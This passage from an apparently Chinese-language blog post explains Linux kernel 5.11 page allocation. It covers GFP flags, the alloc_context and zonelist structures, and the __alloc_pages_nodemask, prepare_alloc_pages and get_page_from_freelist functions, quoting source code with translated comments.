align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS</td><td align="left">分配内存时可以被阻塞(即休眠)</td></tr><tr><td align="left">GFP_KERNEL_ACCOUNT</td><td align="left">GFP_KERNEL |__GFP_ACCOUNT</td><td align="left">和GFP_KERNEL作用一样，但是分配的过程会被kmemcg记录</td></tr><tr><td align="left">GFP_NOWAIT</td><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">分配过程中不允许因直接内存回收而导致停顿</td></tr><tr><td align="left">GFP_NOIO</td><td align="left">__GFP_RECLAIM</td><td align="left">不需要启动任何的I&#x2F;O操作</td></tr><tr><td align="left">GFP_NOFS</td><td align="left">__GFP_RECLAIM |__GFP_IO</td><td align="left">不会有访问任何文件系统的操作</td></tr><tr><td align="left">GFP_USER</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS |__GFP_HARDWALL</td><td align="left">用户空间的进程分配内存</td></tr><tr><td align="left">GFP_DMA</td><td align="left">__GFP_DMA</td><td align="left">从ZONE_DMA区分配内存</td></tr><tr><td align="left">GFP_DMA32</td><td align="left">__GFP_DMA32</td><td align="left">从ZONE_DMA32区分配内存</td></tr><tr><td align="left">GFP_HIGHUSER</td><td align="left">GFP_USER | __GFP_HIGHMEM</td><td align="left">用户进程分配内存，优先使用ZONE_HIGHMEM， 且这些页面不允许迁移</td></tr><tr><td align="left">GFP_HIGHUSER_MOVABLE</td><td align="left">GFP_HIGHUSER | __GFP_MOVABLE</td><td align="left">和GFP_HIGHUSER类似，但是页面可以迁移</td></tr><tr><td align="left">GFP_TRANSHUGE_LIGHT</td><td align="left">GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td align="left">透明大页的内存分配， light表示不进行内存压缩和回收</td></tr><tr><td align="left">GFP_TRANSHUGE</td><td align="left">GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td align="left">和GFP_TRANSHUGE_LIGHT类似，通常khugepaged使用该标志</td></tr></tbody></table><h2 id="二、alloc-context-结构体：分配的上下文"><a href="#二、alloc-context-结构体：分配的上下文" class="headerlink" title="二、alloc_context 结构体：分配的上下文"></a>二、alloc_context 结构体：分配的上下文</h2><p>这是一个分配过程中非常重要的结构体，用来表示我们单次内存分配的上下文信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 用以保存在分配时涉及到的函数间传递的</span><br><span class="hljs-comment"> * 绝大部分的不可变的分配参数的结构体，</span><br><span class="hljs-comment"> * 包括 alloc_pages 函数族</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * nodemask, migratetype 与 highest_zoneidx 仅在</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() 中被初始化一次，之后不再改变.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist, preferred_zone 与 highest_zoneidx 最初在</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() 中为快速路径设置, 之后可能会在</span><br><span class="hljs-comment"> * __alloc_pages_slowpath() 中被改变. 其他所有的函数通过</span><br><span class="hljs-comment"> * 常量指针传递该结构体。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> *<span class="hljs-title">zonelist</span>;</span><br><span class="hljs-type">nodemask_t</span> *nodemask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">preferred_zoneref</span>;</span><br><span class="hljs-type">int</span> migratetype;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * highest_zoneidx 表示分配请求中最高的可用 zone 的下标。</span><br><span class="hljs-comment"> * 由于 zone 的性质, 相较于 highest_zoneidx，</span><br><span class="hljs-comment"> * 在更低的 zone 上的内存会由 lowmem_reserve[highest_zoneidx] 保护。</span><br><span class="hljs-comment"> * 译注：就是水位线机制，不记得的回去看上一篇文章</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * highest_zoneidx 同样被回收/压缩使用以限制目标 zone，</span><br><span class="hljs-comment"> * 因为高于该下标的 zone 无法用于此分配请求</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">highest_zoneidx</span>;</span><br><span class="hljs-type">bool</span> spread_dirty_pages;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们主要关注如下成员：</p><ul><li>zonelist</li></ul><p>该成员表示在<strong>这一次的分配上下文</strong>中，我们将要操作的 zone 的<strong>列表</strong>，其为一个 <code>zonelist</code> 类型的<strong>结构体数组</strong>，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表，</span><br><span class="hljs-comment"> * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。</span><br><span class="hljs-comment"> * 用来访问所给的 zoneref 结构体信息的帮助函数有：</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry</span><br><span class="hljs-comment"> * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index</span><br><span class="hljs-comment"> * zonelist_node_idx()- 返回作为 entry 的 node 的 index</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> _<span class="hljs-title">zonerefs</span>[<span class="hljs-title">MAX_ZONES_PER_ZONELIST</span> + 1];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到的是其为一个  <code>zoneref</code> 类型的结构体数组，该结构体定义如下，包含了一个 zone 的指针以及一个 index：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 该结构包含了 zonelist 中一个 zone 的信息。 </span><br><span class="hljs-comment"> * 其被储存在这里以预防对大结构体的解引用与对表的查询。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><span class="hljs-comment">/* 指向实际上的 zone 的指针 */</span><br><span class="hljs-type">int</span> zone_idx;<span class="hljs-comment">/* zone_idx(zoneref-&gt;zone) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>preferred_zoneref</li></ul><p>该成员为一个 <code>zoneref</code> 类型的结构体，表示<strong>优先用来进行分配的 zone</strong></p><ul><li>spread_dirty_pages</li></ul><p>布尔值，表示<strong>此次分配是否可能产生脏页</strong>（需要进行写回），通常分配需要写入的页会出现</p><h2 id="三、-alloc-pages-nodemask-：分配页面的「核心函数」，返回-page-结构体"><a href="#三、-alloc-pages-nodemask-：分配页面的「核心函数」，返回-page-结构体" class="headerlink" title="三、__alloc_pages_nodemask()：分配页面的「核心函数」，返回 page 结构体"></a>三、__alloc_pages_nodemask()：分配页面的「核心函数」，返回 page 结构体</h2><p>该函数是 buddy system 中用以进行页面分配的<strong>核心函数</strong>，所有的页面分配 API 都是基于该函数的封装，其需要传入的四个参数为：</p><ul><li><code>gfp_mask</code>：分配行为参数（可以参见 <a href="https://blog.csdn.net/choumin/article/details/109603011">这里</a>）</li><li><code>order</code>：分配的连续物理页框的阶</li><li><code>preferred_nid</code> 选取的节点的 id</li><li><code>nodemask</code>：</li></ul><p>返回值为分配的<strong>连续物理页</strong>中的第一张物理页的 <code>page</code> 结构体</p><blockquote><p>如果你已经不记得 page 结构体与物理页的页框号间的转换公式了，可以回去看<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#%EF%BC%881%EF%BC%89page-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%B0-PFN%EF%BC%9Apage-%E7%BB%93%E6%9E%84%E4%BD%93%E5%9C%B0%E5%9D%80%E5%87%8F%E5%8E%BB%E5%AF%B9%E5%BA%94-mem-section-gt-section-mem-map">上一篇文章</a></p><p>当然，笔者比较好心（笑），这里直接给出计算公式，<code>mem_section</code> 结构体中的 <code>section_mem_map</code> 成员存储了其起始地址减掉其起始地址对应的物理页框的页框号的差值，该成员与 page 结构体间做<strong>指针差值运算</strong>便能获得 page 结构体对应的物理页框号：<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p></blockquote><p>这是一张_Overview_</p><p><img src="https://i.loli.net/2021/11/30/9srbaMvWeTSO1hc.png" alt="从知乎偷的.png"></p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is the &#x27;heart&#x27; of the zoned buddy allocator.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_nodemask</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">preferred_nid</span>,</span><br><span class="hljs-class"><span class="hljs-title">nodemask_t</span> *<span class="hljs-title">nodemask</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags = ALLOC_WMARK_LOW;<br><span class="hljs-type">gfp_t</span> alloc_mask; <span class="hljs-comment">/* 实际用于分配的 gfp_t ，这是一个int类型的整型*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> <span class="hljs-title">ac</span> =</span> &#123; &#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们假定 order 的值在一些地方是正常的，</span><br><span class="hljs-comment"> * 因此若请求超出范围则提前退出</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;<br>WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>gfp_mask &amp;= gfp_allowed_mask;<br>alloc_mask = gfp_mask;<br><span class="hljs-keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 直到所有的 local zone 都被考虑之前，</span><br><span class="hljs-comment"> * 禁止从 falling back 到内存碎片种类的第一次传递</span><br><span class="hljs-comment"> */</span><br>alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);<br><br><span class="hljs-comment">/* 第一次分配尝试 */</span><br>page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);<br><span class="hljs-keyword">if</span> (likely(page))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 应用作用域分配约束 这主要与 GFP_NOFS 有关。</span><br><span class="hljs-comment"> * GFP_NOIO 必须从一个特定的由 memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;</span><br><span class="hljs-comment"> * 所标记的上下文中所有的分配请求中继承</span><br><span class="hljs-comment"> */</span><br>alloc_mask = current_gfp_context(gfp_mask);<br>ac.spread_dirty_pages = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 恢复最初的 nodemask （其可能被替换为 &amp;cpuset_current_mems_allowed</span><br><span class="hljs-comment"> * 以优化快速（分配）路径的尝试）</span><br><span class="hljs-comment"> */</span><br>ac.nodemask = nodemask;<br><br>page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);<br><br>out:<br><span class="hljs-keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;<br>    unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="hljs-number">0</span>)) &#123;<br>__free_pages(page, order);<br>page = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br>EXPORT_SYMBOL(__alloc_pages_nodemask);<br></code></pre></td></tr></table></figure><p>这个函数的具体步骤主要分为三步：</p><ul><li>检查参数合法性，并做分配前准备工作</li><li>进行<strong>快速分配</strong>，成功则直接返回结果</li><li>若快速分配失败，则进行<strong>慢速分配</strong></li></ul><p>接下来我们来深入快速分配与慢速分配的内部细节</p><h3 id="I-prepare-alloc-pages-：分配前的准备工作"><a href="#I-prepare-alloc-pages-：分配前的准备工作" class="headerlink" title="I. prepare_alloc_pages()：分配前的准备工作"></a>I. prepare_alloc_pages()：分配前的准备工作</h3><p>这个函数比较简单，主要是做分配前的一些准备的工作，包括初始化 <code>alloc_context</code> 结构体、获取 zone 数组等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">prepare_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">int</span> preferred_nid, <span class="hljs-type">nodemask_t</span> *nodemask,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> alloc_context *ac, <span class="hljs-type">gfp_t</span> *alloc_mask,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *alloc_flags)</span><br>&#123;<br>ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);<br>ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask); <span class="hljs-comment">// 获取 zonelist</span><br>ac-&gt;nodemask = nodemask;<br>ac-&gt;migratetype = gfp_migratetype(gfp_mask);<br><br>    <span class="hljs-comment">// 若开启了 cpuset（限制某一组进程只运行在某些cpu和内存节点上），则设置对应的标志位。</span><br><span class="hljs-keyword">if</span> (cpusets_enabled()) &#123;<br>*alloc_mask |= __GFP_HARDWALL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若我们在中断上下文中, 则这与当前进程上下文无关。</span><br><span class="hljs-comment"> * 这意味着任一 node 都是 ok 的.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)<br>ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;<br><span class="hljs-keyword">else</span><br>*alloc_flags |= ALLOC_CPUSET;<br>&#125;<br><br>fs_reclaim_acquire(gfp_mask);<br>fs_reclaim_release(gfp_mask);<br><br>might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);<br><br><span class="hljs-keyword">if</span> (should_fail_alloc_page(gfp_mask, order))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);<br><br><span class="hljs-comment">/* Dirty zone 的平衡仅在 fast path 中完成 */</span><br>ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * preferred zone 被用于进行数据统计， 但非常重要的是其页被用作</span><br><span class="hljs-comment"> * zonelist 迭代器的起始点. 对于忽略内存策略的分配，其可能会被重置。</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先调用 <code>node_zonelist()</code> 从 <code>preferred_nid</code> 参数所指定的 node 中获取一个 zonelist，其实就是取 <code>pglist_data-&gt;node_zonelists[gfp_zonelist(flags)]</code></li><li>进行 cpuset 相关判断与标志位设置，若是在中断上下文则直接将 nodemask 设为 <code>cpuset_current_mems_allowed</code></li><li>最后调用 <code>first_zones_zonelist()</code> 设置 preferred zone，大概是在 zonelist 中→nodemask 所包含的 zone 中→ <code>highest_zoneidx</code> 以下的第一个 zone</li></ul><blockquote><p>反正源码注释是这么写的hhh</p></blockquote><h3 id="II-get-page-from-freelist-：快速分配路径（核心分配函数）"><a href="#II-get-page-from-freelist-：快速分配路径（核心分配函数）" class="headerlink" title="II. get_page_from_freelist()：快速分配路径（核心分配函数）"></a>II. get_page_from_freelist()：快速分配路径（核心分配函数）</h3><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是遍历分配上下文对应的 zonelist 中的 zone 进行内存分配，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_page_from_freelist 遍历 zonelist 尝试分配页面</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<br><span class="hljs-title function_">get_page_from_freelist</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order, <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> alloc_context *ac)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">z</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">last_pgdat_dirty_limit</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> no_fallback;<br><br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 扫描 zonelist, 寻找有着足够空闲页面的 zone.</span><br><span class="hljs-comment"> * 参见 __cpuset_node_allowed() 的注释（kernel/cpuset.c）</span><br><span class="hljs-comment"> */</span><br>no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT; <span class="hljs-comment">// 避免内存碎片的flag</span><br>z = ac-&gt;preferred_zoneref; <span class="hljs-comment">// 先尝试从 preferred zone 中分配</span><br>    <span class="hljs-comment">// 这是一个封装宏，表示从 z 开始遍历 zonelist 中的 zoneref 数组，</span><br>    <span class="hljs-comment">// 其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</span><br>    <span class="hljs-comment">// 在 nodemask 的 zone 中，以当前 zone 作为起点游标的</span><br>    <span class="hljs-comment">// 【位于或低于】highest_zoneidx 的下一个 zone</span><br>for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,<br>ac-&gt;nodemask) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mark;<br><br>        <span class="hljs-comment">// 开启了 cpuset 且 flag 中有 ALLOC_CPUSET 标志位，</span><br>        <span class="hljs-comment">// 但是 cpuset 中不允许以该 gfp_mask 在该 zone 中分配，</span><br>        <span class="hljs-comment">// 进行下一次迭代</span><br><span class="hljs-keyword">if</span> (cpusets_enabled() &amp;&amp;<br>(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;<br>!__cpuset_zone_allowed(zone, gfp_mask))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在分配页缓存（page cache）页以进行写入时, 我们想要</span><br><span class="hljs-comment"> * 在一个节点的“脏限制”（dirty limit）内获得他, </span><br><span class="hljs-comment">         * 由此，没有一个节点有着超过全局允许的脏页比例。</span><br><span class="hljs-comment"> * 脏限制考虑了节点的低端内存保留和高水位线，</span><br><span class="hljs-comment"> * 以便于 kswapd 能平衡它，而不必从其 LRU 列表中写入页面。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">XXX:</span> 现在, 在进入回收之前，</span><br><span class="hljs-comment"> * 允许分配可能超过 慢速路径中 (spread_dirty_pages unset)</span><br><span class="hljs-comment"> * 单节点的 dirty limit，这在一个允许节点们在一起都未够大以达到全局限制</span><br><span class="hljs-comment">         * 的 NUMA 设置中是很重要的。对于这些情况的合适的修补将需要对</span><br><span class="hljs-comment"> * dirty-throttling 与 flusher threads 中节点的意识.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 译注：原文就是XXX，笔者也不知道这个XXX是什么...</span><br>        <span class="hljs-comment">// 大概就是检查当前zone对应node的脏页数量是不是达到限制了</span><br><span class="hljs-keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;<br><span class="hljs-keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;<br>last_pgdat_dirty_limit = zone-&gt;zone_pgdat;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// node 数量大于1，且当前 zone 并非 preferred zone</span><br><span 